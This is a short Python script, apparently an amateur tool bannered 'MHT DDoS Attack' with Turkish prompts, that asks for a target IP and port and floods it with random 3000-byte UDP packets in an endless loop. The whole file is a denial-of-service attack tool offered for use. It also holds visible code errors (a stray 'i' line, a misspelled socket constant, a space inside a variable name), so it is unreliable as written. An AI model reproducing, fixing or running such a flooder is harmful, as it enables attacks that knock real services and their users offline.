import socket
import random
import os
i
os.system("clear")
banner="""
##############################################
#              Coder-ByMazarat               #
#                                            #     
#              MHT DDoS Attack               #
#                                    v0.1    #
##############################################

"""

print(banner)


hedef_ip=raw_input("hedef ip: ")
hedef_port=input("hedef port: ")


bytes=random._urandom(3000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAN)


sayac=0
while True:
        sock.sendto(bytes,(hedef ip,hedef port))
        sayac=sayac+1
        print("saldrici baslatildi,gonderile paket:%s"%(sayac))